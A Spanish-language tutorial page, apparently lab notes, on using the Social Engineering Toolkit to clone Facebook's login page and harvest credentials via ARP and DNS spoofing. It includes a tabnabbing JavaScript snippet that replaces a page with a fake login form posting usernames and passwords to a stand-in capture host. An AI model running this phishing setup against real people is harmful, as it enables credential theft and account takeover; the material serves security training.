# Social Engineering ToolKit (SET)

Esta herramienta una de sus principales funciones es la de emular una pagina web que quieras totalmente exacta a la que elijas, reconstruyendo su codigo fuente para que sea una copia y con ello que se pueda hacer una especie de `phishing`.

Para mas informacion nos podremos ir al `github` de la herramienta en el siguiente link:

URL = [Social Engineering Toolkit GitHub](https://github.com/trustedsec/social-engineer-toolkit)

Esta herramienta ya viene instala por defecto en `kali`.

En tal caso de que no viene el repositorio, solo tendreis que instalar lo siguiente y ya la tendriais:

```shell
sudo apt install set
```

La iniciaremos con el siguiente comando:

```shell
setoolkit
```

Y nos aparecera como un `disclaimer` para aceptar que vamos a utilizar la herramienta con buenas acciones y no con malas, por lo que le daremos a la `y`, y esto nos metera en la herramienta:

<figure><img src="../../.gitbook/assets/image (127) (1).png" alt=""><figcaption></figcaption></figure>

Esto lo que hace automaticamente es replicar una pagina web que elijamos y capturar las credenciales que se introduzcan por parte del usuario para que nos llegue a nosotros.

Le daremos al numero `1` y despues al numero `2`, tendremos que ver esto en nuestro `prompt` de terminal:

```
set:webattack>
```

Seguidamente le daremos al numero `5` y despues al numero `3`.

Nos dira que si la IP que vemos reflejada en el `prompt` es la correcta, ya que la detecta automaticamente, de ser asi le dariamos a `ENTER` de lo contrario metemos nosotros la IP y `ENTER`.

Ahora nos pedira la pagina la cual queremos replicar, por lo que buscaremos `facebook.es`, dentro del login de `facebook` le daremos click derecho en la pagina -> `Save Page As ...` -> cambiar la parte de `Web Page, Complete` por `Web Page, HTML Only` -> lo renombramos como index.html -> `Save`

Metemos la ruta donde este ese `index.html`, despues nos aparecera que importemos la `URL` pondremos `facebook.es` para que nos aparezca este dominio y le daremos a `ENTER`, si tenemos `apache2` corriendo nos dira que si lo queremos desactivar para que lo active el, le daremos a `y`, en tal caso de que no estuviera activado, ya estaria lista la herramienta.

Por lo que si visitamos `http://localhost/` nos dira un link de que se movio la pagina a otro sitio y esto nos redirigira a la pagina `phishing` de `facebook.es` exactamente igual a la original:

> NOTA POSIBLE ERROR:

Si por ejemplo diera un error en la parte de cuando dejas en blanco lo de la `URL` tendriamos que hacer lo siguiente:

```shell
sudo nano /usr/local/share/setoolkit/src/webattack/tabnabbing/source.js

#Dentro del nano

// source.js: Simulación básica de Tabnabbing
window.onload = function () {
    // Tiempo de espera para simular cambio de pestaña (en milisegundos)
    setTimeout(function () {
        // Cambia el contenido de la página después de 3 segundos
        document.body.innerHTML = `
            <h1>Inicia sesión para continuar</h1>
            <form action="http://example.com/capture" method="POST">
                <label for="username">Usuario:</label>
                <input type="text" id="username" name="username"><br><br>
                <label for="password">Contraseña:</label>
                <input type="password" id="password" name="password"><br><br>
                <button type="submit">Iniciar sesión</button>
            </form>
        `;
        document.title = "Inicio de sesión - Seguridad";
    }, 3000);
};
```

Guardamos esto y volvemos a ejecutar la herramienta, con esto deberia de funcionar ya.

<figure><img src="../../.gitbook/assets/image (128) (1).png" alt=""><figcaption></figcaption></figure>

Una vez que tengamos corriendo esta pagina y estando en mitad de la comunicacion con el `ARP Spoofing` y el `DNS Spoofing` que le redirija a esta pagina cuando meta `facebook.es`, ya podremos probar a como si fueramos el usuario desde la maquina `windows` a meter `facebook.es` en el navegador y metes unas credenciales, por lo que si visitamos dicho dominio, veremos que funciona ya que nos aparece nuestra pagina falsa.

Cuando metemos nuestras credenciales como usuario normal, podremos ver que en la maquina atacante las recivimos:

<figure><img src="../../.gitbook/assets/image (129) (1).png" alt=""><figcaption></figcaption></figure>
